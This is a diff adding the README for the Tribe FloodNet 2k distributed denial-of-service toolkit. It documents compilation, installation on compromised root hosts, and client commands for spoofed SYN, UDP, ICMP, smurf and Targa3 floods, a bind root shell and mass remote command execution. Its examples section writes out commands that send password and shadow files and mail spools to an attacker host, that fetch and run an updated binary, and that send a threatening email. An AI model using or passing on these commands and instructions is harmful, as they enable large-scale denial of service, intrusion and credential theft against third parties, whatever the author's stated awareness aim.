@@ -1,0 +1,258 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+
+
+		      Tribe FloodNet 2k edition
+		Distributed Denial Of Service Network
+		(c) Mixter <mixter@newyorkoffice.com>
+
+
+   Contents:
+
+     0. About
+
+     1. Feature description
+
+     2. Compilation
+
+     3. Installation
+
+     4. Using the client
+     4.1. Using TFN for other distributed tasks
+
+     5. Technology description
+
+     6. Conclusions and Acknowledgements
+
+
+
+About
+
+TFN can be seen as the yet most functional DoS attack tool with the best
+performance that is now almost impossible to detect. What is my point in
+releasing this? Let me assure you it isn't to harm people or companies. It
+is, however, to scare the heck out of everyone who does not care about
+systematically securing his system, because tools sophisticated as this one
+are out, currently being improved drastically, kept PRIVATE, and some of them
+not with the somewhat predictable functionality of Denial Of Service. It is
+time for everyone to wake up, and realize the worst scenario that could happen
+to him if he does not care enough about security issues.
+Therefore, this program is also designed to compile on a maximum number of
+various operating systems, to show that almost no modern operating system is
+specifically secure, including Windows, Solaris, most UNIX flavors and Linux.
+
+
+Feature description
+
+Using distributed client/server functionality, stealth and encryption
+techniques and a variety of functions, TFN can be used to control any
+number of remote machines to generate on-demand, anonymous Denial Of
+Service attacks and remote shell access. The new and improved features in
+this version include: 
+
+Functionality additions:
+* Remote one-way command execution for distributed execution control
+* Mix attack aimed at weak routers
+* Targa3 attack aimed at systems with IP stack vulnerabilities
+* Compatibility to many UNIX systems and Windows NT
+
+Anonymous stealth client/server communication using:
+* spoofed source addresses
+* strong advanced encryption
+* one-way communication protocol
+* messaging via random IP protocol
+* decoy packets
+
+
+Compilation
+
+You have to agree to the disclaimer in order to compile TFN.
+Before you compile, make sure to edit src/Makefile and uncomment the options
+for your operating system. You are advised to take a look at src/config.h and
+edit it to change some important default values.
+Once you start compiling, you will be prompted for a server password that can
+be 8 to 32 characters long. If you compile with REQUIRE_PASS, you will need
+to remember and type in this password in order to use the client.
+
+
+Installation
+
+The TFN server is installed on a host running as root (or euid root).
+It will not commit changes of system configuration in any way itself,
+so you would have to make it restarting after system reboots.
+Once the server is installed, you can add the hostname to your list
+of ready servers (but you can contact single servers as well).
+The TFN client can be run from most (root) shells and windows command
+line (with Administrator privileges needed on NT).
+
+
+Using the client
+
+The client, tfn, is used to contact the servers, which then will
+change their configuration, spawn a shell, or control flood against
+a multiple number of victim hosts. You can either read the servers
+hosts from a file containing the hostnames:	tfn -f file
+or you can contact one server at a time:	tfn -h hostname
+The default command issued is to stop flooding by killing all
+child threads on the server hosts. Commands can generally be issued
+with -c <id>. See TFN command line and descriptions below.
+The option -i is needed to give option values to commands, and to
+parse the string of target hosts, which consists of all victim hosts,
+separated by a delimiter character, which is @ by default. When using
+smurf flood, only the first target is a victim and the following ones
+are used as directed broadcast flood amplifier addresses.
+
+ID 1 - Anti Spoof Level: The DoS attack commenced by the servers will
+ always emanate from spoofed source IP addresses. With this command,
+ you can control which part of the IP address will be spoofed, and
+ which part will contain real bits of the actual IP.
+ID 2 - Change Packet Size: The default ICMP/8, SMURF, and UDP attacks
+ use packets of a minimal size by default. You can increase this size
+ by changing the payload size of each packet in bytes.
+ID 3 - Bind root shell: Starts a one-session server that drops you
+ to a root shell when you connect to the specified port.
+ID 4 - UDP flood attack. This attack can be used to exploit the fact
+ that for every udp packet sent to a closed port, there will be an
+ ICMP unreachable message sent back, multiplying the attacks potential.
+ID 5 - SYN flood attack. This attack steadily sends bogus connection
+ requests. Possible effects include denial of service on one or more
+ targeted ports, filled up TCP connection tables and attack potential
+ multiplication by TCP/RST responses to non-existent hosts.
+ID 6 - ICMP echo reply (ping) attack. This attack sends ping requests
+ from bogus source IPs, to which the victim replies with equally large
+ response packets.
+ID 7 - SMURF attack. Sends out ping requests with the source address
+ of the victim to broadcast amplifiers, hosts that reply with a
+ drastically multiplied bandwidth back to the source.
+ID 8 - MIX attack. This sends UDP, SYN and ICMP packets interchanged
+ on a 1:1:1 relation, which can specifically be hazard to routers and
+ other packet forwarding devices or NIDS and sniffers.
+ID 9 - TARGA3 attack. Uses random packets with IP based protocols and
+ values that are known to be critical or bogus, and can cause some IP
+ stack implementations to crash, fail, or show other undefined behavior.
+ID 10 - Remote command execution. Gives the opportunity of one-way
+ mass executing remote shell commands on the servers. See sub section
+ 4.1 on further usage of this function.
+For further information on the options, see also the command line help.
+
+
+Using TFN for other distributed tasks
+
+According to the CERT advisory, recent versions of distributed attack
+tools also include a new popular feature: self-updating software.
+While I didn't explicitly include this function, it is basically possible
+to do with TFN. Command #10, remote command execution, gives the TFN
+user the ability of executing the same shell commands in "batch" mode on
+any number of remote hosts. This should be regarded as a tiny demonstration
+that distributed network tools are capable of virtually anything, beyond
+such relatively simple things as Denial Of Service attacks.
+
+Following are some fun but thoroughly evil examples:
+(These are EXAMPLES, not suggestions.. just in case you plan on suing me =P)
+
+Remotely self-updating TFN servers:
+ Set up an account "user" at sample.edu for world access by putting
+ "+ +" into "~/.rhosts". Place "tfn3000" into /tmp, and issue the command:
+ tfn -f hosts.txt -c10 -i "( rcp user@sample.edu:/tmp/tfn3000 /tmp/tfn3000\
+ && killall -9 td && mv -f /tmp/tfn3000 /etc/owned/td && /etc/owned/td ) &"
+Fetch password files:
+ On your local host, type: while :; do 'nc -l -p 666 >> passwds' ; done
+ Now issue the command: tfn -f hosts.txt -c10 -i "( hostname ; ypcat \
+ passwd || cat /etc/passwd /etc/shadow ) | telnet intruders.org 666"
+Fun with Network Intrusion Detection:
+ tfn -f hosts.txt -c10 -i "echo 'GET /cgi-bin/phf?Qname=x%0A/bin/something\
+ %20is%20wrong%20with%20your%20IDS' | telnet www.security-corporation.com 80"
+Fun with e-mail:
+ tfn -f hosts.txt -c10 -i "cat ~mail/* | gzip -c | uuencode -m surprise.gz \
+ | mail -s surprise root@intruders.org"	or
+ tfn -f hosts.txt -c10 -i "echo better take care, people could accidentally\
+ shoot you | mail -s 'a word of warning' president@whitehouse.gov"
+
+Just a few of the possibilities, use your imagination... if nothing else
+gets people to secure their networks, maybe these perspectives will. O:)
+
+
+Technology description
+
+TFN consists of a client and an unlimited number of servers that are
+each installed on different hosts. Each one of these servers is
+utilized to commence floods with spoofed source IPs.
+Communication between client and server is realized using a randomly
+chosen protocol, TCP, UDP or ICMP, with internal values optimized so
+that no recognizable pattern can be found in client/server communication
+and that the packets easily pass through most filtering mechanisms.
+The actual Tribe Protocol (tm) is contained in the packet payload.
+It is CAST-256 encrypted and base64 encoded, and is decoded by the
+TFN servers in first place. The payload then consists of the header,
+which is the command ID surrounded by two equal characters, and
+followed by the target or option string.
+The clients source IP address is generally spoofed, but a custom IP
+may be used for purposes like evasion of rfc2267 ingress/egress
+filtering, as well as a custom protocol.
+Additionally, any amount of decoy packets can optionally be sent out
+with every real packet, in order to obscure the real servers locations,
+thereby completely obscuring the client/server communication.
+
+
+Conclusions and Acknowledgements
+
+If any conclusion can be made, then it is that you cannot reliably trust
+pattern or attack signature matching when it comes to providing systematic,
+real, security. This includes network and host based intrusion detection
+(no typical default strings can be found in the server executable.. oh and
+by the way, even if it could be detected, there are public programs that
+convert ELF binaries to self-extracting compressed executables...).
+Examine the TFN server closely, look at the resources it uses, try netstat
+or strace, and you will find that it looks very harmless. Imagine binaries
+like these installed on your systems, and conclude, that only systematic and
+consequent security efforts can ensure you a secure environment.
+Shouts to phifli and random, other authors of distributed DoS, so1o /
+Code Zero for their ICMP tunneling code, Steven K., David Brumley and
+Dave Dittrich who analyzed distributed attack tools in the first place.
+
+For more information on distributed attack tools and security, see:
+
+* distributed attack tool collection
+http://packetstorm.securify.com/distributed
+
+* distributed attack tools CERT advisory
+http://www.cert.org/incident_notes/IN-99-07.html
+
+* tools and other publications from me
+http://mixter.void.ru
+
+
+Mixter
+
+
+MD5SUMS
+
+28c9ca45a0efc86aa4ce79ea04f8a481  Makefile
+7d45db74140a457966d1b6e5abd15b53  src/Makefile
+be00356daefa5dc90e7838acdf24f898  src/aes.c
+640aeacbd88ee76789e980bcff48642f  src/aes.h
+4a963f419f2e47f5279c38faf05c39b1  src/base64.c
+8f6ab658ecc6985432931995d797b52a  src/cast.c
+57799312d11c174f3089dd2165a51104  src/config.h
+7addb56200ebd7f8d438a15b5ccf85b8  src/disc.c
+d7f4138165a5a13981f36c7a6804d9e5  src/flood.c
+12e38b0e674de1b763ecac60b3fd6366  src/ip.c
+83b151072d26250cf608e81105c3bd01  src/ip.h
+1786c88475b5188340240539813e5d1f  src/mkpass.c
+38cac21f5ba17909ea251d182da9f1a9  src/process.c
+4b502ea1b820b0f9b210b8eae01afc2b  src/td.c
+4341813bcce5e5caf9de53d8f2749d4c  src/tfn.c
+93461e1f5016be38a15f674bf92e0dc8  src/tribe.c
+562f6979a23e4a8c9852ee11b7d1f379  src/tribe.h
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGP for Personal Privacy 5.0
+Charset: noconv
+
+iQEVAwUBOFvn+rdkBvUb0vPhAQEDfQf9HDWYJQDb2WWAGcmB3mHcdV8spWWskOiE
+2MH0+vjgVcKrrjb2pmkVrolPKzh64PN+2ZHI8z/6fVWJq6NPeii17vcs2vySu9Xv
+VUYOVQafhl14pdMpQuyOILMKcIspeDo3eATOLznjombTxRYFwnut3DPer+1vfJXp
+D/jcnLEmmtuW1IHbwURDz3ncQ1iM/+F94qJLfpDZPC+yBjje5MlG1ZEGkeTSiyil
+3qjRlhdXxjk5efW+144WJ1AZFg3HQHSJFk5YJDDCTOhGyYDJfxumBanple2bZd8L
+DUkwZ50ZsXI0AN01hnwwy5dwoCBWuTlCo2RtZndTai0+tRZZN5zV8w==
+=XRYt
+-----END PGP SIGNATURE-----
